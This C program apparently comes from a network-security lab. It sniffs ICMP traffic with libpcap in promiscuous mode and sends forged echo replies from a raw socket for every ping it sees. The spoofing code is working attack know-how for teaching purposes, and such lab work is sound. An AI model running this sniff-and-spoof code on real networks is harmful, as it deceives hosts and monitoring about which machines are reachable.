#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <pcap.h>

#include "myheader.h"

unsigned short in_cksum (unsigned short *buf, int length);
void send_raw_ip_packet(struct ipheader* ip);

void spoof_reply(struct ipheader *ip)
{
	   char buffer[1500];
	   int ip_header_len=ip->iph_ihl * 4;
	   struct icmpheader *icmp = (struct icmpheader *)
                             ((u_char *)ip + ip_header_len );
	if(icmp->icmp_type != 8){return;}
	
	   

   memset(buffer, 0, 1500);
   memcpy(buffer, ip, ntohs(ip->iph_len));

   /*******************
      Step 1: Fill in the ICMP header.
    ********************/
   struct icmpheader *newicmp = (struct icmpheader *)
                             (buffer + ip_header_len);
   newicmp->icmp_type = 0; //ICMP Type: 8 is request, 0 is reply.
	newicmp->icmp_id= icmp->icmp_id;
	newicmp->icmp_seq= icmp->icmp_seq;
   // Calculate the checksum for integrity
   newicmp->icmp_chksum = 0;
   newicmp->icmp_chksum = in_cksum((unsigned short *)newicmp,
   sizeof(struct icmpheader));

   /*******************
      Step 2: Fill in the IP header.
    ********************/
   struct ipheader *newip = (struct ipheader *) buffer;
   newip->iph_ttl = 20;
   newip->iph_sourceip.s_addr = ip->iph_destip.s_addr;
   newip->iph_destip.s_addr = ip->iph_sourceip.s_addr;

   newip->iph_len = htons(sizeof(struct ipheader) +
                       sizeof(struct icmpheader));

   /*******************
      Step 3: Finally, send the spoofed packet
    ********************/
   send_raw_ip_packet(newip);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header,
                              const u_char *packet)
{
  struct ethheader *eth = (struct ethheader *)packet;

  if (ntohs(eth->ether_type) == 0x0800) { // 0x0800 is IP type
    struct ipheader * ip = (struct ipheader *)
                           (packet + sizeof(struct ethheader)); 

    printf("       From: %s\n", inet_ntoa(ip->iph_sourceip));   
    printf("         To: %s\n", inet_ntoa(ip->iph_destip));    

    spoof_reply(ip);
  }
}


/**********************
  Spoof an ICMP echo request using an arbitrary source IP Address
***********************/
int main() {

   
   pcap_t *handle;
   char errbuf[PCAP_ERRBUF_SIZE];
   struct bpf_program fp;
   char filter_exp[] = "icmp";
   bpf_u_int32 net;

   // Step 1: Open live pcap session on NIC with name ens33
   handle = pcap_open_live("ens33", BUFSIZ, 1, 1000, errbuf);

   // Step 2: Compile filter_exp into BPF psuedo-code
   pcap_compile(handle, &fp, filter_exp, 0, net);
   pcap_setfilter(handle, &fp);

   // Step 3: Capture packets
   pcap_loop(handle, -1, got_packet, NULL);

   pcap_close(handle);   //Close the handle
   return 0;
}
